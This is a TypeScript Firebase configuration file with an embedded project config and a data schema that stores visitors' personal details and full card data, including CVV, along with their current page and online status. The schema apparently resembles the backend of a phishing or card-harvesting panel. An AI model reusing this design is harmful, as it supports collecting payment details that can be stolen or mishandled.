import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyD_pAGfrLh3kNQz-UrCyHvCganH0oqpGns",
  authDomain: "abbb-e95ea.firebaseapp.com",
  databaseURL: "https://abbb-e95ea-default-rtdb.firebaseio.com",
  projectId: "abbb-e95ea",
  storageBucket: "abbb-e95ea.firebasestorage.app",
  messagingSenderId: "846219345131",
  appId: "1:846219345131:web:38bb079306c7d51c5fd2ae",
  measurementId: "G-4DKQ003N49"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);
export { app, auth, db,database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
  isOnline?: boolean
  lastSeen: string
}
